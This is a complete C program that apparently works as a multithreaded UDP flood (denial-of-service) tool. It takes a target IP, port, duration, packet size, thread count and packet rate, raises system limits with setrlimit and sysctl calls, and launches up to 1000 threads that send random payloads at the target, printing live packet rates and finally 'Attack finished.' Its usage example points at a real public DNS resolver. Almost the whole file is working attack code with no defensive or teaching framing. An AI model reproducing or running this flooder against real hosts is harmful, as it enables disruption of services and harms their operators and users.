#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <errno.h>
#include <stdint.h>
#include <stdatomic.h>

#define MAX_PAYLOAD_SIZE 2048
#define MAX_THREADS      1000

typedef struct {
    char target_ip[16];
    int target_port;
    int duration;
    int packet_size;
    int thread_id;
    int sock;
    char *shared_payload;
    uint64_t pps_limit;         // packets-per-second target for THIS thread
} attack_params;

// Global atomic counter for total packets sent
_Atomic uint64_t total_packets_sent = 0;

volatile sig_atomic_t keep_running = 1;

void handle_signal(int sig) {
    keep_running = 0;
}

void increase_system_limits() {
    struct rlimit lim;

    lim.rlim_cur = lim.rlim_max = 1048576;
    setrlimit(RLIMIT_NOFILE, &lim);

    lim.rlim_cur = lim.rlim_max = 100000;
    setrlimit(RLIMIT_NPROC, &lim);

    system("sysctl -w net.core.rmem_max=2500000 >/dev/null 2>&1");
    system("sysctl -w net.core.wmem_max=2500000 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_mem='2097152 4194304 8388608' >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_rmem_min=1048576 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_wmem_min=1048576 >/dev/null 2>&1");
}

void generate_random_payload(char *payload, int size) {
    for (int i = 0; i < size; i++) {
        payload[i] = rand() % 256;
    }
}

int get_random_source_port() {
    return (rand() % (65535 - 1024 + 1)) + 1024;
}

int setup_udp_socket() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return -1;

    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = INADDR_ANY;

    int attempts = 12;
    while (attempts--) {
        sa.sin_port = htons(get_random_source_port());
        if (bind(sock, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
            return sock;
        }
    }

    close(sock);
    return -1;
}

void *udp_flood(void *arg) {
    attack_params *p = (attack_params *)arg;

    struct sockaddr_in dst = {0};
    dst.sin_family      = AF_INET;
    dst.sin_port        = htons(p->target_port);
    dst.sin_addr.s_addr = inet_addr(p->target_ip);

    if (dst.sin_addr.s_addr == INADDR_NONE) {
        fprintf(stderr, "[thread %d] Invalid IP\n", p->thread_id);
        return NULL;
    }

    if (!p->shared_payload) {
        fprintf(stderr, "[thread %d] NULL payload\n", p->thread_id);
        return NULL;
    }

    time_t end_time = time(NULL) + p->duration;

    if (p->pps_limit == 0) {
        // Unlimited mode
        while (time(NULL) < end_time && keep_running) {
            sendto(p->sock, p->shared_payload, p->packet_size, 0,
                   (struct sockaddr *)&dst, sizeof(dst));
            atomic_fetch_add(&total_packets_sent, 1);
        }
        return NULL;
    }

    // Rate-limited mode
    const uint64_t interval_ns = 1000000000ULL / p->pps_limit;

    struct timespec next_send;
    clock_gettime(CLOCK_MONOTONIC, &next_send);

    while (time(NULL) < end_time && keep_running) {
        struct timespec now;
        clock_gettime(CLOCK_MONOTONIC, &now);

        if (now.tv_sec < next_send.tv_sec ||
           (now.tv_sec == next_send.tv_sec && now.tv_nsec < next_send.tv_nsec)) {

            struct timespec diff = {
                .tv_sec  = next_send.tv_sec  - now.tv_sec,
                .tv_nsec = next_send.tv_nsec - now.tv_nsec
            };
            if (diff.tv_nsec < 0) {
                diff.tv_sec--;
                diff.tv_nsec += 1000000000L;
            }

            if (diff.tv_sec > 0 || diff.tv_nsec > 2000000L) {
                nanosleep(&diff, NULL);
            }
        }

        sendto(p->sock, p->shared_payload, p->packet_size, 0,
               (struct sockaddr *)&dst, sizeof(dst));

        atomic_fetch_add(&total_packets_sent, 1);

        // Advance next send time
        uint64_t next = (uint64_t)next_send.tv_sec * 1000000000ULL + next_send.tv_nsec;
        next += interval_ns;
        next_send.tv_sec  = next / 1000000000ULL;
        next_send.tv_nsec = next % 1000000000ULL;
    }

    return NULL;
}

// Statistics thread: prints real-time PPS
void *stats_thread(void *arg) {
    time_t start = time(NULL);
    uint64_t last_packets = 0;
    int interval = 1;  // update every 1 second

    printf("\n[STAT] Waiting for first packets...\n");

    while (keep_running) {
        sleep(interval);

        uint64_t now_packets = atomic_load(&total_packets_sent);
        time_t   now_time    = time(NULL);

        uint64_t delta_packets = now_packets - last_packets;
        double   delta_sec     = (double)(now_time - start);
        double   inst_pps      = (interval > 0) ? (double)delta_packets / interval : 0.0;
        double   avg_pps       = (delta_sec > 0.01) ? (double)now_packets / delta_sec : 0.0;

        printf("[STAT] %4llu s | total: %-10llu pkts | inst: %-8.0f pps | avg: %-8.0f pps\n",
               (unsigned long long)(now_time - start),
               (unsigned long long)now_packets,
               inst_pps,
               avg_pps);

        last_packets = now_packets;

        if (!keep_running) break;
    }

    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 7) {
        fprintf(stderr,
            "Usage: %s <target_ip> <port> <seconds> <packet_size> <threads> <total_pps>\n"
            "Example:\n  %s 8.8.8.8 53 60 128 120 50000\n\n",
            argv[0], argv[0]);
        return 1;
    }

    increase_system_limits();

    char target_ip[16];
    strncpy(target_ip, argv[1], sizeof(target_ip)-1);

    int target_port  = atoi(argv[2]);
    int duration     = atoi(argv[3]);
    int packet_size  = atoi(argv[4]);
    int n_threads    = atoi(argv[5]);
    uint64_t total_pps = strtoull(argv[6], NULL, 10);

    if (packet_size < 1 || packet_size > MAX_PAYLOAD_SIZE) {
        fprintf(stderr, "packet_size must be 1–%d\n", MAX_PAYLOAD_SIZE);
        return 1;
    }
    if (n_threads < 1 || n_threads > MAX_THREADS) {
        fprintf(stderr, "threads 1–%d\n", MAX_THREADS);
        return 1;
    }

    srand(time(NULL) + getpid());
    signal(SIGINT,  handle_signal);
    signal(SIGTERM, handle_signal);

    // Shared payload
    int shmfd = shm_open("/udpflood_payload", O_CREAT|O_RDWR, 0666);
    if (shmfd == -1) { perror("shm_open"); return 1; }

    if (ftruncate(shmfd, MAX_PAYLOAD_SIZE) == -1) {
        perror("ftruncate"); close(shmfd); return 1;
    }

    char *payload = mmap(NULL, MAX_PAYLOAD_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, shmfd, 0);
    if (payload == MAP_FAILED) {
        perror("mmap"); close(shmfd); return 1;
    }

    generate_random_payload(payload, packet_size);

    uint64_t pps_per_thread = (total_pps + n_threads - 1) / n_threads;
    if (total_pps == 0) pps_per_thread = 0;

    printf("\n  Target:      %s:%d\n", target_ip, target_port);
    printf("  Duration:    %d s\n", duration);
    printf("  Packet size: %d bytes\n", packet_size);
    printf("  Threads:     %d\n", n_threads);
    printf("  Target PPS:  %llu  (≈ %llu pps/thread)\n\n", (unsigned long long)total_pps, (unsigned long long)pps_per_thread);

    pthread_t     threads[MAX_THREADS];
    attack_params params[MAX_THREADS];
    pthread_t     stats_tid;

    int created = 0;

    // Start stats thread early
    pthread_create(&stats_tid, NULL, stats_thread, NULL);

    for (int i = 0; i < n_threads; i++) {
        int sock = setup_udp_socket();
        if (sock < 0) {
            fprintf(stderr, "socket failed for thread %d\n", i);
            continue;
        }

        strncpy(params[i].target_ip, target_ip, sizeof(params[i].target_ip)-1);
        params[i].target_port   = target_port;
        params[i].duration      = duration;
        params[i].packet_size   = packet_size;
        params[i].thread_id     = i;
        params[i].sock          = sock;
        params[i].shared_payload = payload;
        params[i].pps_limit     = pps_per_thread;

        if (pthread_create(&threads[i], NULL, udp_flood, &params[i]) == 0) {
            created++;
        } else {
            close(sock);
        }
    }

    printf("Launched %d threads + stats thread\n\n", created);

    // Wait for all flood threads
    for (int i = 0; i < n_threads; i++) {
        if (pthread_join(threads[i], NULL) == 0) {
            close(params[i].sock);
        }
    }

    // Let stats thread see final numbers (give it one more second)
    sleep(1);
    keep_running = 0;
    pthread_join(stats_tid, NULL);

    munmap(payload, MAX_PAYLOAD_SIZE);
    close(shmfd);
    shm_unlink("/udpflood_payload");

    uint64_t final = atomic_load(&total_packets_sent);
    printf("\nAttack finished.\n");
    printf("Total packets sent: %llu\n", (unsigned long long)final);

    return 0;
}
